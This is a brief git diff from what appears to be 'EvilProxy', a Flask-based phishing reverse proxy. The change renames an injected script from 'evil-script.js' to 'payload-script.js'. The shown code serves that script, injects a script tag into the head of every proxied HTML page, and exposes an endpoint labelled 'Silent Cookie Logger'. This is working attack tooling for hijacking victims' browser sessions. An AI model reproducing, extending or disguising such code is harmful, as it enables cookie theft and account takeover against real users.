@@ -18,9 +18,9 @@ def start_proxy(target, host, port, secret):
     def panel_banner():
         return send_from_directory('panel', 'EvilProxyBanner.png')
 
-    @app.route('/evil-script.js')
+    @app.route('/payload-script.js')
     def payload():
-        return send_from_directory('.', 'evil-script.js')
+        return send_from_directory('.', 'payload-script.js')
 
     # API:
     @app.route('/ep/api/ping', methods=['POST']) # Silent Cookie Logger
@@ -109,7 +109,7 @@ def start_proxy(target, host, port, secret):
         # Payload Injection
         if 'content-type' in resp.headers and 'text/html' in resp.headers['content-type']:
             resp_content = resp_content.decode('utf-8')
-            resp_content = re.sub(r'<head>', r'<head><script src="/evil-script.js"></script>', resp_content)
+            resp_content = re.sub(r'<head>', r'<head><script src="/payload-script.js"></script>', resp_content)
             resp_content = resp_content.encode('utf-8')
 
         for key in response_headers:
